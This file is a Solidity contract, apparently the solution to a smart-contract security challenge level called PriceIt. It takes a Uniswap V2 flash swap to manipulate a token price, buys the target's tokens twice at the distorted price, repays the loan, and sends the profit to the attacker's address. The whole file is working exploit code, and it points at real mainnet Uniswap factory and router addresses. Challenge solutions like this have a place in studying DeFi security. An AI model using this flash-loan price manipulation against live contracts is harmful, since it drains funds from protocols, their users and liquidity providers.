// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '../levels/PriceIt.sol';

contract PriceItAttack {
  IUniswapV2Factory private uniFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
  IUniswapV2Router02 private uniRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
  IERC20 private token0;
  IERC20 private token1;
  IERC20 private token2;
  IUniswapV2Pair private token0Token2Pair;
  PriceIt private instance;
  address private attacker;

  function doYourThing(PriceIt _instance) external {
    attacker = msg.sender;
    instance = _instance;
    token0 = instance.token0();
    token1 = instance.token1();
    token2 = instance.token2();
    token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
    uint256 flashSwapAmount = 50000 ether;
    bytes memory data = abi.encode(token0, token1, token2, token0Token2Pair, flashSwapAmount, _instance, msg.sender);
    if (address(token0) < address(token2)) {
      IUniswapV2Pair(token0Token2Pair).swap(flashSwapAmount, 0, address(this), data);
    } else {
      IUniswapV2Pair(token0Token2Pair).swap(0, flashSwapAmount, address(this), data);
    }
  }

  function uniswapV2Call(
    address,
    uint256 amount0Out,
    uint256 amount1Out,
    bytes calldata
  ) external {

    uint256 flashSwapAmount = amount0Out > 0 ? amount0Out : amount1Out;
    token0.approve(address(uniRouter), flashSwapAmount);
    uint256 token1Output = swapTwoTokens(token0, token1, flashSwapAmount);
    token1.approve(address(instance), token1Output);
    instance.buyToken(token1Output / 2, token1);
    instance.buyToken(token1Output / 2, token1);
    returnFlashSwap(address(token0), address(token0Token2Pair), flashSwapAmount);
    token0.transfer(attacker, token0.balanceOf(address(this)));
  }

  function swapTwoTokens(
    IERC20 from,
    IERC20 to,
    uint256 inputAmount
  ) private returns (uint256 outputAmount) {
    address[] memory path = new address[](2);
    path[0] = address(from);
    path[1] = address(to);
    from.approve(address(uniRouter), inputAmount);
    uint256[] memory outputs = uniRouter.swapExactTokensForTokens(inputAmount, 0, path, address(this), block.timestamp);
    return outputs[1];
  }

  function returnFlashSwap(
    address tokenBorrow,
    address pair,
    uint256 amountTaken
  ) private {
    // about 0.3%
    uint256 fee = ((amountTaken * 3) / 997) + 1;
    uint256 amountToRepay = amountTaken + fee;
    IERC20(tokenBorrow).transfer(pair, amountToRepay);
  }
}
